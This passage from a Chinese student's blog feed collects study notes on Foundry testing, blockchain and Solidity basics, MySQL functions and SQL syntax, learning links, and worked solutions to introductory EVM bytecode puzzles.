id="编写测试合约"><a href="#编写测试合约" class="headerlink" title="编写测试合约"></a>编写测试合约</h2><p>必要工作，导入：import “forge-std&#x2F;Test.sol”<br>setUP函数，是一个可选函数，在运行测试用例之前调用，用于初始化测试环境<br>以test为前缀的函数将被识别为测试用例并执行<br>testFail函数，用于指示预期的测试失败，如果此函数未触发还原，则测试失败</p><p>还有一些高级的测试技术：expectRevert：它是进行精准的错误处理，例如,vm.expectRevert(Some.Error.selector) &#x2F;&#x2F;可触发SomeError一些错误</p><p>共享设置：通过创建抽象合约并在测试合约中继承它，可以设置共享：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abstract contract SetupHelper &#123;</span><br><span class="line">    // Shared setup codes</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract MyTest is Test, SetupHelper &#123;</span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        // Shared setup</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过共享设置可以避免在每个测试合约中重复相同的初始化代码，提高代码的可重用性和可维护性</p><p>导入文件，用<br>import “forge-std&#x2F;Test.sol”<br>这个是必要的</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>区块链知识巩固</title>
      <link href="/2024/09/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9F%A5%E8%AF%86%E5%B7%A9%E5%9B%BA/"/>
      <url>/2024/09/20/%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9F%A5%E8%AF%86%E5%B7%A9%E5%9B%BA/</url>
      
        <content type="html"><![CDATA[<p>最近别人分享了一个网站，对于一些知识巩固我觉得挺好的</p><p>网站链接我就放在<a href="https://updraft.cyfrin.io/">这里</a></p><p>学习这个网站，我就在这个博客上分享一些我的笔记</p><h2 id="一，基本常识"><a href="#一，基本常识" class="headerlink" title="一，基本常识"></a>一，基本常识</h2><p>1，Oracle: 就是充当区块链与外部世界联系的中介，允许智能合约与真实世界交互数据<br>2，Layer2: 它是构建在Laryer1之上的技术，它可以提高区块链交易的扩展性和效率，它通常在交易之外执行，就是为了避免交易拥挤和一些费用产生，如比特币闪电网络<br>3，DAPP：去中心化的应用，通常在区块链上运行，就类比我们现实生活中的app，就是应用<br>4，智能合约：它使自动执行的合约，在区块链上运行<br>5,web3: 它是一个未获许可依赖于去中心化的，也是一个术语，它开创了一个抗审查和透明协议和交易的一个领域<br>6，Chainlink: 它与区块链上的预言机，它通过链上的逻辑和链下的数据和计算，确保这个逻辑和这个数据保持去中心化<br>7，一个区块包括，区块头，区块体</p><blockquote><p>区块头：nonce(交易的计数),前一个哈希值（注意：创世区块没有父哈希值）时间戳，三个树根（状态树根：记录所有账户的余额，信息等，交易树根，收据树根，币基（识别矿工的地址），难度目标（表示挖矿的难度）</p></blockquote><blockquote><p>区块体：包含了这个区块的所有交易哈希值</p></blockquote><p>8，以以太坊为例：从上到下分为：区块链，区块，交易</p><blockquote><p>交易：一个账户向另一个账户发送信息的行为，当发起交易时，以太坊客户端或者钱包会生成交易数据.交易数据包括：nonce(发送方的交易数量)，gasPrice(发送方愿意支付的gas费用)，gasLimit(发送方设置本次最大的gas费用)，to(接收方的地址)，value(要发送的钱)，data(智能合约的字节码)，v r s (交易的签名，又发送方的私钥产生)<br>9，软硬分叉：从字面上理解，就是一个妥协，一个强硬，区块链上的软硬分叉正是因为时代的更新，链上出现了分歧，那么如何解决呢，这是就出现了分叉，从项目上来说，一个项目的分叉（fork），分为一个子项目，那么开发人员就会分别进行这俩个项目，但是区块链上，就不同，就出现了俩种概念</p></blockquote><ul><li>软分叉：向前兼容，旧版本接受新版本的东西，但是在旧版本的算力要大于51%，才能产生软分叉，最后链比较长的保留</li><li>硬分叉：不兼容，旧版本和新版本是完全分开的，它不需要算力大于51%（因为即使旧版本的链长于新版本，但是也不影响新版本，因为新版本不会接受旧版本的东西，而旧版本夜也不会接受新版本的东西）,直接产生硬分叉</li></ul><h2 id="二，solidity的知识查漏补缺"><a href="#二，solidity的知识查漏补缺" class="headerlink" title="二，solidity的知识查漏补缺"></a>二，solidity的知识查漏补缺</h2><p>1，我感觉学了Java的话会很好理解。<br>2，使用结构体时，采用实例化对象，如果对象很多，就采用动态数组，这样就比较方便<br>  eg,定义一个名Person的结构体，用Person[] list_of_people ,那么list_of_people数组就可以储存多个Person对象<br>3，注意到了一个智能问答小助手，名为<a href="https://www.phind.com/search?home=true">phind</a>,就是可以用它来检查你的合约是否缺逗号问题啥的<br>4，数据储存：calldata，它是只能读，不能调用使用。但是在合约中内存memory可以允许读写，让变量改变在函数中，为了修改calldata我们必须先将它储存到内存memory中。calldata和memory，都是临时储存变量。Storage储存变量，它是持久的储存在区块链上，被外部调用时会保留它们的值，任何在函数外部声明的变量都会隐式的转化储存变量，但是不能在函数中定义使用Storage,只能使用calldata和memory。<br>5，映射，在前面我们也了解到，用动态数组储存Person对象，但是如果有很多对象，而我们要找其中一个，就必须从头历遍，这样就会佷麻烦，所以就出现了映射，构造一个映射对象，将一个变量和另一个变量联系起来，提供噶我们的查找效率<br>6，合约实例部署，使用new关键字，类似于java的理解。首先你将要部署的合约A和我们的工厂合约B放在一起，然后在工厂合约B中用A定义a，再定义一个函数create，里面写a&#x3D;new A();这样一个合约实例就部署出来了，没使用create的时候，可以看见a的地址为0，使用后就可以发现a就有地址了，也可以说是，我们把合约A部署出来了，还有一种简单的方法，采用import关键字，这样就可以不用把合约A和合约B写在一起了，直接就是improt”.&#x2F;A”</p><blockquote><p>import的使用方法：如果要导入的合约只包含一个合约，就可以直接使用 import”.&#x2F;“,如果是要导入的合约中包括很多种合约，然后你要使用哪种合约，就在{}里写，在” “写来源，就是大合约，import {A,B} from “.&#x2F;A”;</p></blockquote><p>7，继承于重写：俩个关键字 override，virtual，例如A is B{}；A合约继承B合约，我们要修改A中继承B合约的函数，那么，我们就要在A合约中要修改的函数加上override关键字，在B合约被修改的函数中加上vritual关键字，这样就不会报错<br>8，一个可以计算，wei,Gwei,Ether,之间的转化的工具：<a href="https://eth-converter.com/">Converter</a>;<br>9,gas:交易所产生的手术费，如果一个交易被revert了，那么它的gas就不会返回，为了解决这个问题，以太坊就有一个功能，自己设置能承担的最大gas费用<br>10，库：真的是查漏补缺了，这个库，我还是第一次了解到，库就是为了简化智能合约，使用Library关键字，定义一个Math的库，Library Math{};里面就放函数，在其他合约中可以直接使用库.函数名，直接进行调用，或者使用use for ,例如要在合约中uint类型的变量可以使用Math库，就直接use Math for uint;这样合约中的uint类型的变量就可以使用Math库中的函数，uint类型.函数名，（注意的先使用import导入库）<br>11，注意合约的solidity的版本，在0.6版本时，没有对溢出的一个检查，但是使用SafeMath.sol可以对它进行检查。在solidity版本0.8以上时，它有检查上溢和下溢的功能，所以就不需要使用SafeMath.sol<br>12,重置阵列：使用new关键字，即将每个元素都重置为零，例如：fouder &#x3D; new address<a href=""></a>;还有一种delete.直接删除变量的值<br>13，modifier:修饰器，如果合约较长，而我们又必须每个检查合约的所有者，使用require的话会很繁杂，所以就有修饰器了，例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">modifier onlyOwner&#123;</span><br><span class="line">  require(msg.sender == onwer,&quot;Sender is not owner&quot;);</span><br><span class="line">  _;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意这里有个_,如果函数使用了onlyOwner的修饰符，那么就会先执行_以前的代码，如果成功，再执行函数中的代码<br>14，自定义错误：从solidity的0.8.4开始，引入了自定义的错误，用于节省Gas并提高更加具体的错误信息，revert用于手动触发异常，例如</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function withdraw (uint amount )&#123;</span><br><span class="line">  if(amount&gt;balance)&#123;</span><br><span class="line">    revert (&quot;Insufficient Balance&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而自定义错误，用于提供更详细和节省Gas的错误信息，例如:error InsufficientBalance(uint requested,uint available);使用的时候用revert即可：revert InsufficientBalance(requested:amount,available:balance);<br>15，receive(): 适用于合约中有它，且没有msg.data的存在，而fallback()就是相反<br>16，一些有用的小助手<br><a href="https://chatgpt.com/">ChatGPT</a>;<br>谷歌开发的一个智能软件：<a href="https://gemini.google.com/app">Gemini</a>；<br>一个社区的检索问题：<a href="https://ethereum.stackexchange.com/">Ethereum-Stack-Exchange</a><br>一个社区的全球交流平台：<a href="https://stackoverflow.com/">stackoverflow</a>;<br>web一个知识构建平台：<a href="https://www.peeranha.io/get-started">Peerhana</a>;</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>&#39;数据库原理及应用进阶&#39;</title>
      <link href="/2024/09/18/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8%E8%BF%9B%E9%98%B6/"/>
      <url>/2024/09/18/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8%E8%BF%9B%E9%98%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h1><h2 id="MySQL内置函数"><a href="#MySQL内置函数" class="headerlink" title="MySQL内置函数"></a>MySQL内置函数</h2><p>一，含义：是指一段可以直接被另一段程序调用的程序或代码</p><p>二，分类：</p><ul><li><p>字符串函数 （使用时，前面加select）eg,select concat（’he’,’DE’）</p><ul><li>CONCAT（S1,S2,S3）：字符串拼接，将S1,S2,S3拼接成一个字符串</li><li>LOWER（str）：将字符串str全部转化为小写</li><li>UPPER(str) : 将字符串str全部转化为大写</li><li>LPAD（str,n,pad）:左填充，用字符串pad对str的左边进行填充，达到n个字符串的长度</li><li>RPAD (str,n,pad) :右填充，用字符串pad对str的右边进行填充，达到n个字符串的长度</li><li>TPIM（str）：去掉字符串头部和尾部的空格</li><li>SUBSTRING(str,start,len):返回从字符串str从start位置起的len个长度的字符串</li><li>例如，如果要单个工号前面添加0000，就使用update 表名 set workno &#x3D; lpad(workno,5,’0’)</li></ul></li><li><p>数值函数</p><ul><li>CEIL(x):向上取整</li><li>FLOOR（x）:向下取整</li><li>MOD (x,y): 返回x&#x2F;y的模</li><li>RAND（）：返回0-1内的随机数</li><li>ROUND（x,y）：求x四舍五入的值，暴露y位小数   </li><li>例如随机生成一个6位数的验证码，select lpad（round(rand()<em>1000000,0)，6，’0’）,首先进行生成0-1的随机数，然后乘以1000000就变成了一个六位数带有小数的数，在用round（）四舍五入消除小数，注意，如果是0.012345</em>1000000就会只有5位数，所以我们要进行填充，使用lpad或者rpad都可以</li></ul></li><li><p>日期函数</p><ul><li>CURDATE()：返回当前日期</li><li>CURTIME(): 返回当前时间</li><li>NOW(): 返回当前日期和时间</li><li>YEAR(date)：获取指定date的年份</li><li>MONTH(date): 获取指定date的月份</li><li>DAY（date）：获取指定date的日期</li><li>DATE_ADD(date,INTERVAL expr type):返回一个日期&#x2F;时间值加上一个时间间隔expr后的时间值</li><li>DATEDIFF(date1,date2):返回起始时间date1,和结束时间date2之间的天数</li><li>例如，从当前日期往后推70天，select date_add(now(),INTERVAL 70 DAY);查询员工入职的天数并降序排序，select name datediff(curdate(),entrydate) as ‘entrydays’ from 表 order by entrydays desc;使用datediff函数，为了方便排序，用as 给计算的天数起个别名，方便order by 使用</li></ul></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>数据库原理及应用基础</title>
      <link href="/2024/09/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/"/>
      <url>/2024/09/13/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h2><p>1，数据是数据库储存的基本对象，而数据库则是长期储存在计算机中，有组织，可共享的大量数据的集合<br>   基本特点：永久储存，有组织，可共享，冗余度小，易扩展<br>2，一些基本模型术语：</p><ul><li>关系（r）：就是一个整体的表，可对关系的描述:关系名 (属性1，属性2…..)；关系名就是表名；<ul><li>关系完整性约束条件：实体，参照，用户定义完整性</li></ul></li><li>属性：表中的一列为一个属性</li><li>域：属性的取值范围，一个具有相同类型的值集合</li><li>元组（t）：表中的一行</li><li>主码：也叫码键，表中的某个属性组，它可以唯一确定一个元组，就是一个比较特殊可以用它来确定唯一的值，有点类似于c中的指针；</li><li>分量：元组中的一个属性值</li><li>关系模式：对关系的描述，也叫联系<br>3，数据库系统里有三种模式：<br>a,模式（逻辑模式，概念模式）：数据库中的全体数据逻辑结构和特征的描述，与物理储存的细节和硬件环境，与具体的应用程序，开发环境及高级程序设计语言无关，它是数据库系统模式的中间层<br>b，外模式（子模式，用户模式）：数据库用户使用的局部数据的逻辑结构和特征的描述，是与某一应用有关的数据的逻辑表示，<strong>每个用户</strong>只能看见和访问对应的外模式中的数据，用户只能与外模式建立联系<br>c，内模式（储存模式，物理模式）：是数据物理结构和储存方式的描述，是数据在数据库内部的表示方式：记录的储存方式，索引的组织方式，数据是否压缩储存，数据是否加密，数据储存记录记录结构的规定<blockquote><p>用户-外模式-模式-内模式</p></blockquote></li></ul><p>4，二级映像，三级模式<br>4，<strong>E-R图</strong>：实体用方框，属性用椭圆，关系用菱形</p><hr><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><h3 id="基本含义："><a href="#基本含义：" class="headerlink" title="基本含义："></a>基本含义：</h3><p>数据模型组成的三要素：数据结构，数据操作，数据的完整性约束条件<br>数据库(DB)：储存数据的仓库<br>数据库管理系统（DBMS）<br>数据库系统（DBS）：包含了数据库和数据库管理系统<br>型：对某一类数据的结构和属性的说明，值：对型的一个具体赋值<br>笛卡尔积：域的相乘，就是域之间的排列组合<br>基数：一个域允许的不同取值的个数。如域d1,的基数为2，域d2的基数为3，则总基数为2*3&#x3D;6；<br>MySQL: 操纵何管理数据库的软件，下载安装后，在终端打开，用：net start mysql80,停止用：net stop mysql80<br>MySQL数据库模型：<br>1，关系型数据库（RDBMS）：建立在关系型模型基础上，由多张相互连接的二维表组成的数据库<br> <a href="http://www.mysql.com/">下载安装MySQL</a><br> 1,登录数据库命令：cd  C:\Program Files\MySQL\MySQL Server 8.0\bin（由于我配置了环境变量，所这步可以省略）<br> 2, 客户端连接，输入mysql -h localhost -u root -p,进入数据库,也可以直接在开始直接打开MySQL的命令提示板输入密码即可<br> 3,输入show databases; 查看当前数据库列表<br> 4,退出执行命令：exit或者quit</p><blockquote><p>一些专业的名词解释：1，索引：加快查询速度的有效方式，用户可以在基本表上建立一个或者多个索引，以提供存取路径，索引是属于内模式的范畴。唯一的索引：使用UNIQUE关键字，每个索引值对应唯一一条数据记录 2，视图：视图是从一个或者几个基本表导出的表，数据库只存在视图的定义而不是存放视图对应的数据，基本表中的数据发生变化，从视图查询出的数据也会随之变化。</p></blockquote><h3 id="SQL："><a href="#SQL：" class="headerlink" title="SQL："></a>SQL：</h3><p>SQL：是用于管理数据库的标准化编程语言，它用于查询，更新，插入和删除数据库中的数据，操作数据库的语言，不管什么数据库管理系统（DBMS），SQL都实用<br>以下所写都是用的关系模型；</p><h4 id="一，SQL的通用语法："><a href="#一，SQL的通用语法：" class="headerlink" title="一，SQL的通用语法："></a>一，SQL的通用语法：</h4><p>a，可单行或多行书写，一分号结尾<br>b,可以使用空格或者缩进来增强语句的可读性<br>c,MySQL数据库的SQL语句部区分大小写，关键字建议大写<br>d,注释：</p><ul><li>单行注释：– 注释内容或 #注释内容（MySQL特有）</li><li>多行注释：&#x2F;* 注释内容*&#x2F;</li></ul><h4 id="二，SQL的分类："><a href="#二，SQL的分类：" class="headerlink" title="二，SQL的分类："></a>二，SQL的分类：</h4><h5 id="DDL"><a href="#DDL" class="headerlink" title="DDL"></a>DDL</h5><p>1，DDL：数据定义语言，用来定义数据库对象（数据库，表，字段）</p><p>a,DDL-数据库操作：</p><ul><li>查询：<ul><li>查询所有数据库：SHOW DATABASES；</li><li>查询当前数据库：SELECT DATABASE();</li></ul></li><li>创建：<ul><li>CREATE DATABASE[IF NOT EXISTS]数据库名[DEFAULT CHARSET 字符集] [COLLATE 排序规则]；<blockquote><p>括号代表可以有的，eg:CREATE DATABASE IF NOT EXISTS itcast DEFAULT CHARSET utf8mb4;也可以直接创建CREATE DATABASE itcast;</p></blockquote></li></ul></li><li>删除：<ul><li>DROP DATABASE[IF EXISTS]数据库名；</li></ul></li><li>使用：<ul><li>USE 数据库名；顾名思义切换到一个数据库中</li></ul></li></ul><p>b,DDL-表操作</p><ul><li>查询<ul><li>查询当前数据库所有表：SHOW TABLES;</li><li>查询表的结构：DESC 表名；</li><li>查询指定表的建表语句 SHOW CREATE TABLE 表名；</li></ul></li><li>创建<ul><li>CREATE TABLE 表名（<br> 字段1 字段类型 COMMENT 字段1注释，<br> 字段1 字段类型 COMMENT 字段1注释，<br> 字段n 字段类型 COMMENT 字段n注释<br>）[COMMENT 表注释] ；<br>（注意：最后一个字段没有逗号，字段的注释必须用’’围住,可以先在记事本上写，然后直接复制）<br>mysql&gt; CREATE TABLE tb_user(<br>-&gt; id int COMMENT ‘编号’<br>-&gt; ) COMMENT ‘用户表’;</li></ul></li></ul><p>c,DDL-表操作-数据类型</p><ul><li>数值类型（参照Java）<ul><li>TINYINT(1byte)，SMALLINT(2bytes),MEDIUMINT(3bytes)，INT(4bytes),BIGINT(8bytes),FLOAT(4bytes),DOUBLE(8bytes)</li><li>有符号（SIGNED），范围有负数，无符号（UNSIGNED），范围无负数，eg:TINYINT 有符号：-128<del>127，无符号：0</del>255；</li><li>举例：年龄：age TINYINT UNSIGNED；分数：score DOUBLE(4,1)，4为标度，总共的数字个数，1为精度，小数的位数</li></ul></li><li>字符串类型<ul><li>CHAR ：定长字符串；VARCHAR：变长字符串；TEST:长文本数据；</li><li>CHAR(10),性能好；VARCHAR(10)</li></ul></li><li>日期时间类型<ul><li>DATE:范围：1000-01-01至9999-12-31，格式：YYYY-MM-DD  日期值  eg:brithday DATE</li><li>TIME:范围：-838：59：59至838：59：59，格式：HH:MM:SS  时间值</li><li>YEAR:范围：1901至2155   格式：YYYY 年份值</li><li>DATETIME:混合日期和时间 格式：YYYY-MM-DD HH-MM-SS</li><li>TIMESTAMP :混合日期和时间，时间戳 格式：YYYY-MM-DD HH-MM-SS</li></ul></li></ul><p>d,DDL-表操作-修改</p><ul><li>添加字段：ALTER TABLE 表名 ADD 字段名 类型（长度）[COMMENT 注释] [约束 ]；</li><li>修改字段<ul><li>修改数据类型 ： ALTER TBALE 表名 字段名 新数据类型（长度）；</li><li>修改字段名，字段类型 ：ALTER TABLE 表名 CHANGE 旧字段名 新字段名 类型（长度）[COMMENT 注释] [约束 ]；</li></ul></li><li>删除字段 : ALTER TABLE 表名 DROP 字段名；</li><li>修改表名 ：ALTER TABLE 表名 RENAME TO 新表名；</li><li>删除：<ul><li>删除表 ：DROP TABLE [IF EXISTS]表名；</li><li>删除指定表，并重新创建该表 : TRUNCATE TABLE 表名；（一般不使用它，因为它会重新创建该表，只是没有结构）<br>MySQL 图形化界面：DataGrip,使用它就可以直接写了</li></ul></li></ul><hr><h5 id="DML"><a href="#DML" class="headerlink" title="DML"></a>DML</h5><p>2，DML：数据操作语言，用来对数据库表中的数据进行修改  涉及的关键字：INSERT INTO<br>a,DML-添加数据：</p><ul><li>给指定字段添加数据：INSERT INTO 表名（字段名1，字段名2… ）VALUES（值1，值2…）；</li><li>给全部字段添加数：INSERT INTO 表名 VALUES（值1，值2…）；值1，就是表中第一列</li><li>批量添加数据：<ul><li>INSERT INTO 表名（字段名1，字段名2… ）VALUES（值1，值2…），（值1，值2…），（值1，值2…）；</li><li>INSERT INTO 表名 VALUE(值1，值2)，（值1，值2…）（值1，值2…）；<br>b，DML-修改数据</li></ul></li><li>UPDATE 表名 SET 字段名1 &#x3D; 值1，字段名2 &#x3D; 值2，…[WHERE 条件]；<br>c,DML-删除数据</li><li>DELETE FROM 表名 [WHERE 条件]；</li></ul><hr><h5 id="DQL"><a href="#DQL" class="headerlink" title="DQL"></a>DQL</h5><p>3，DQL：数据查询语言，用来查询数据库中的表的记录   涉及的关键字：SELECT</p><p>a,DQL-语法（也是编写顺序）：<br>SELECT<br>       字段列表<br>FROM<br>       表名列表<br>WHERE<br>       条件列表<br>GROUP BY<br>       分组字段列表<br>HAVING<br>       分组后条件列表<br>ORDER BY<br>       排序字段列表<br>LIMIT<br>       分页参数</p><p>b,DQL-基本查询</p><ul><li>查询多个字段<ul><li>SELECT 字段1，字段2，字段3…. FROM 表名；</li><li>SELECT *FROM 表名；查询所有字段</li></ul></li><li>设置别名：SELECT 字段1[AS 别名1]，字段2[AS 别名2]…FROM 表名；</li><li>去除重复记录：SELECT DISTINCT 字段列表 FROM 表名；<br>c,DQL-条件查询</li><li>语法：SELECT 字段列表 FROM 表名 WHERE 条件列表；</li><li>条件：where后面可以跟比较运算符（&gt;,&lt;,!&#x3D;,is NULL,BETWEEN    AND ，IN(),LIKE 占位符 _ % ）和逻辑运算符（AND ,&amp;&amp;,OR,||,NOT,!）</li><li>in(),就是括号里的条件任意满足其一即可，between最小值 and 最大值,like 模糊匹配 下划线_占一个字符，百分号% h后跟谁查谁，最后一个字符，例如查询名字为俩个字的员工：like ‘_ _’;  例如查身份证最后一个字符为X：like ‘%x’;</li></ul><p>c,DQL-聚合函数</p><ul><li>介绍：将一列数据作为一个整体，进行纵向计算</li><li>常见的聚合函数<ul><li>count ：统计数量</li><li>max :最大值</li><li>min : 最小值</li><li>avg : 平均值</li><li>sum : 求和</li></ul></li><li>语法<ul><li>SELECT 聚合函数（字段列表）FROM 表名；</li></ul></li></ul><p>d,DQL-分组查询</p><ul><li>语法：SELECT 字段列表 FROM 表名[WHERE 条件] GROUP BY 分组字段名 [HAVING 分组后过滤条件]；</li><li>where与having区别：<ul><li>执行时机不同：where是分组前进行过滤，不满足where条件，不参与分组；而having是分组后对结果进行过滤</li><li>判断条件不同：where不能对聚合函数进行判断，而having可以；</li><li>注意事项：执行顺序：where&gt;聚合函数&gt;having; 分组后，查询的字段一般为聚合函数和分组字段，查询其他字段无任何意义</li></ul></li></ul><p>e,DQL-排序查询</p><ul><li>语法: SELECT 字段列表 FROM 表名 ORDER BY 字段1 排序方式1，字段2，排序方式二；</li><li>排序方式：<ul><li>ASC: 升序（默认值）</li><li>DESC: 降序</li></ul></li></ul><p>f,DQL-分页查询</p><ul><li>语法：SELECT 字段列表 FROM 表名 LIMIT 起始索引，查询记录数；</li><li>注意：<ul><li>起始索引从零开始，起始索引 &#x3D; （查询页码-1）*每页显示记录数</li><li>分页查询是数据库的方言，不同的数据库有不同的实现，MySQL中式LIMIT</li><li>如果查询的是第一页数据，起始索引可以省略，直接写limit 10</li></ul></li></ul><p>h,DQL-执行顺序<br> FROM<br>    表名列表<br>WHERE<br>    条件列表<br>GROUP BY<br>     分组字段列表<br>HAVING<br>     分组后条件列表<br>SELECT<br>     字段列表<br>ORDER BY<br>     排序字段列表<br>LIMIT<br>     分页参数</p><hr><h5 id="DCL"><a href="#DCL" class="headerlink" title="DCL"></a>DCL</h5><p>4，DCL：数据控制语言，用来创建数据库用户，控制数据库的访问权限,就是控制有那些用户可以访问数据库</p><p>a,DCL-用户管理</p><ul><li>查询用户：USE mysql; SELECT *FROM user;</li><li>创建用户：CREATE USER ‘用户名‘@’主机名’ IDENTIFIED BY ‘密码’；</li><li>修改用户密码：ALTER USER ‘用户名‘@’主机名’ IDENTIFIED WITH mysql_native_password BY ‘新密码’；</li><li>删除用户：DROP USER ‘用户名‘@’主机名’；</li><li>主机名：localhost 代表只能在当前主机访问数据库，% 代表可以在任意主机上访问数据库；</li></ul><p>b,DCL-控制权限</p><ul><li>ALL ,ALL PRIVILEGES : 所有权限</li><li>SELECT : 查询数据</li><li>INSERT ：插入数据</li><li>UPDATE : 修改数据</li><li>DELETE : 删除数据</li><li>ALTER : 修改表</li><li>DROP : 删除数据库，表，视图</li><li>CREATE : 创建数据库，表</li><li>主要使用：<ul><li>查询权限：SHOW GRANTS FOR ‘用户名‘@’主机名’；</li><li>授予权限：GRANT 授权列表 ON 数据库名.表名 TO ‘用户名‘@’主机名’;</li><li>撤销权限：REVOKE 权限列表 ON 数据库名.表名 FROM ‘用户名‘@’主机名’；</li></ul></li></ul><hr><p>（由于后面要学习solidity，所以就没有再更新数据库原理了）</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>区块链入门知识常用链接</title>
      <link href="/2024/08/30/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E7%9F%A5%E8%AF%86%E9%93%BE%E6%8E%A5/"/>
      <url>/2024/08/30/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E7%9F%A5%E8%AF%86%E9%93%BE%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<ul><li>推荐这个博主的整个入门区块链的方向，里面有个思维导图，值得一看.<a href="https://dukedaily.github.io/solidity-expert/cn/%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE.html">点击</a></li><li>僵尸编程学习<a href="https://cryptozombies.io/">点击</a></li><li>WTF学院，学习 EVM ，solidity值得一看.<a href="https://www.wtf.academy/">点击</a></li><li>Ethernaut靶场练习，<a href="https://ethernaut.openzeppelin.com/">点击</a></li><li>damn-vulnerable-defi靶场练习，<a href="https://www.damnvulnerabledefi.xyz/">点击</a></li><li>EVM PUZZLES题解参考链接，<a href="https://learnblockchain.cn/article/5533">点击1</a>  <a href="https://dukedaily.github.io/solidity-expert/cn/09_EVM%E8%AF%A6%E8%A7%A3/02-evm-puzzles.html">点击二</a></li><li>evm code指令速查 <a href="https://www.evm.codes/?fork=shanghai">点击</a></li><li>注:自毁函数将会被弃用,<a href="https://eips.ethereum.org/EIPS/eip-4758">点击1</a>,<a href="https://eips.ethereum.org/EIPS/eip-6049">点击2</a></li><li><a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/57_Flashloan/readme.md">闪电贷的极简入门</a></li><li>关于solidity的一些基本问题,用于自查，<a href="https://www.rareskills.io/post/solidity-interview-questions">点击</a></li><li>将本地文件上传到github上，<blockquote><p>要有一个自己想上传的仓库，<br>cd 要上传的文件名，git<br>remote add origin (ssh下的仓库地址)，<br>切换分支，主要是看仓库是master,还是main, 还是其他的分支，git branch -M main , 切换到main分支上<br>直接上传到分支上 git push -u origin main<br>即可</p></blockquote></li></ul><p>一些智能的工具：<br><a href="https://chatgpt.com/">ChatGPT</a>;<br>谷歌开发的一个智能软件：<a href="https://gemini.google.com/app">Gemini</a>；<br>一个社区的检索问题：<a href="https://ethereum.stackexchange.com/">Ethereum-Stack-Exchange</a><br>一个社区的全球交流平台：<a href="https://stackoverflow.com/">stackoverflow</a>;<br>web一个知识构建平台：<a href="https://www.peeranha.io/get-started">Peerhana</a>;</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>EVM puzzle</title>
      <link href="/2024/08/30/EVM-puzzle/"/>
      <url>/2024/08/30/EVM-puzzle/</url>
      
        <content type="html"><![CDATA[<h1 id="EVM-PUZZLE"><a href="#EVM-PUZZLE" class="headerlink" title="EVM PUZZLE"></a>EVM PUZZLE</h1><p><a href="https://github.com/fvictorio/evm-puzzles">运行游戏</a></p><h2 id="puzzle-1-CALLVALUE"><a href="#puzzle-1-CALLVALUE" class="headerlink" title="puzzle 1 CALLVALUE"></a>puzzle 1 CALLVALUE</h2><p>题目：</p><pre>pc     opcode  opcode name01      38      CODESIZE02      03      SUB03      56      JUMP04      FD      REVERT05      FD      REVERT06      5B      JUMPDEST07      00      STOP08      FD      REVERT09      FD      REVERT</pre><p>输入恰当的value，使得题目的 opcode 正确执行，直到执行STOP</p><p>分析：CALLVALUE实际上就是msg.value,它会将msg.value存储到栈顶,而JUMP会读取栈顶值，并跳转到相应的字节地址，由JUMPDEST承接,所以我们只需要让msg.value&#x3D;&#x3D;8即可</p><hr><h2 id="puzzles-2-CODESIZE"><a href="#puzzles-2-CODESIZE" class="headerlink" title="puzzles 2 CODESIZE"></a>puzzles 2 CODESIZE</h2><p>题目：</p><pre>pc      opcode  opcode name00      34      CALLVALUE01      38      CODESIZE02      03      SUB03      56      JUMP04      FD      REVERT05      FD      REVERT06      5B      JUMPDEST07      00      STOP08      FD      REVERT09      FD      REVERT</pre><p>msg.value是多少？</p><p>分析：CALLVALUE存储值到栈顶，STACK：[x]，CODESIZE获取当前EVM环境中的操作码SIZE，每个OPCODE为1byte，我们此时内存中共10个操作码，因此执行CODESIZE后，会向栈顶存入10，STACK：[10, x]，SUB会执行减法操作，并将结果如栈，STACK：[10 - x]<br>JUMP会跳到06字节，因此我们需要 10 - x &#x3D; 6，推导出：x &#x3D; 4，即msg.value为4</p><hr><h2 id="puzzles-3-CALLDATASIZE"><a href="#puzzles-3-CALLDATASIZE" class="headerlink" title="puzzles 3 CALLDATASIZE"></a>puzzles 3 CALLDATASIZE</h2><p>题目：</p><pre>pc      opcode  opcode name00      36      CALLDATASIZE01      56      JUMP02      FD      REVERT03      FD      REVERT04      5B      JUMPDEST05      00      STOP</pre><p>calldata是多少？</p><p>分析：JUMPDEST跳转到04，所以我们只要保证calldata到size为4即可，内容不限。即len(msg.data) &#x3D;&#x3D; 4,msg.data&#x3D;&#x3D;0x11223344</p><blockquote><p>补充：一个字节代表8位二进制数，一个16进制数代表4位二进制数，所以俩个16进制的数就代表一个字节</p></blockquote><hr><h2 id="puzzles-4-XOR"><a href="#puzzles-4-XOR" class="headerlink" title="puzzles 4 XOR"></a>puzzles 4 